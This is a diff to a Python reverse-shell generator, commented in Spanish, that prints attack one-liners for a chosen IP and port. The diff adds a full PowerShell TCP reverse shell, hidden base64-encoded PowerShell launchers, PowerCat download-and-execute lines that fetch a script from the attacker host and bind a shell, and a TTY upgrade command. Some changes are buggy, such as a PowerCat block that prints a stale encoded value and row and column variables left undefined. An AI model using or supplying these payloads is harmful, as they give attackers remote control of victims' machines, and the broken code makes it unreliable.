@@ -5,6 +5,29 @@ import subprocess
 from base64 import b64encode
 import argparse
 
+def build(payload):
+    # Codificar la cadena en UTF-16LE
+    string2 = payload.encode("utf-16le")
+    
+    # Ejecutar el comando base64
+    process = subprocess.Popen(
+        "base64 -w 0", 
+        shell=True, 
+        stdin=subprocess.PIPE, 
+        stdout=subprocess.PIPE, 
+        stderr=subprocess.PIPE
+    )
+    
+    # Enviar los datos al proceso y obtener la salida
+    stdout, stderr = process.communicate(input=string2)
+    
+    # Verificar si hubo errores
+    if process.returncode != 0:
+        raise RuntimeError(f"Command failed with error: {stderr.decode('utf-8')}")
+    
+    # Decodificar y retornar la salida
+    b64 = stdout.decode('utf-8').strip()
+    return b64
 
 
 def print_listener(port):
@@ -19,6 +42,8 @@ def print_tty():
     print(f"stty raw -echo; fg")
     print(f"export TERM=xterm; reset xterm")
 
+    print(f"""python3 -c 'import pty; pty.spawn("/bin/bash")'""")
+
 def print_powershell(ip, port):
 
     
@@ -28,12 +53,14 @@ def print_powershell(ip, port):
     print("\n\n\n********** Powershell reverse shell oneliner **********\n")
     text = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
 
-    encoded = b64encode(text.encode("utf-16le")[2:]).decode()
-    print(text)
-    print(f"\npowershell -nop -w hidden -enc {encoded}")
+    pay = build(text)
+    print(f"powershell -nop -w hidden -enc {pay}")
+    #encoded = b64encode(text.encode("utf-16le")[2:]).decode()
+    #print(text)
+    #print(f"\npowershell -nop -w hidden -enc {encoded}")
 
 
-def print_conpty(ip, port):
+def print_conpty(ip, port, rows, columns):
     print("\n\n\n********** ConPtyShell RevShell **********\n")
     print(f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}")
 
@@ -99,19 +126,21 @@ def print_powercat(ip, port):
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & IEX **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')")
+    print(f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')")
 
     print("\n********** PowerCat Download & IEX b64 **********\n")
-    payload = "IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
+    payload = "IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1')"
     p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
     print(f"powershell -nop -w hidden -enc {p64}")
 
     print("\n********** PowerCat Download & Execution **********\n")
-    print(f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell")
+    print(f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell")
 
     print("\n********** PowerCat Download & Execution b64 **********\n")
-    payload = f"IEX (New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
-    p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
+    p16 = payload.encode("utf-16le")[2:]
+    #p64 = b64encode(payload.encode("utf-16le")[2:]).decode()
+    #print(f"{p16}")
     print(f"powershell -nop -w hidden -enc {p64}")
 
 
@@ -183,13 +212,19 @@ def print_nc(ip, port):
 
 def main():
     if len(sys.argv) < 4:
-        print("Usage: shell <IP> <PORT> <SHELL_TYPE>")
+        print("Usage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS>")
         print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
         sys.exit(1)
 
     ip = sys.argv[1]
     port = sys.argv[2]
     shell_type = sys.argv[3].lower()
+    #rows = sys.argv[4]
+    #cols = sys.argv[5]
+
+    if len(sys.argv) > 4:
+        rows = int(sys.argv[4])
+        cols = int(sys.argv[5])
 
 
     # Ejecutar el comando "stty size"
@@ -206,7 +241,7 @@ def main():
     elif shell_type == "-nishang":
         print_nishang(ip, port)
     elif shell_type == "-conpty":
-        print_bash(ip, port)
+        print_conpty(ip, port, rows, cols)
     elif shell_type == "-php":
         print_php(ip, port)
     elif shell_type == "-bash":
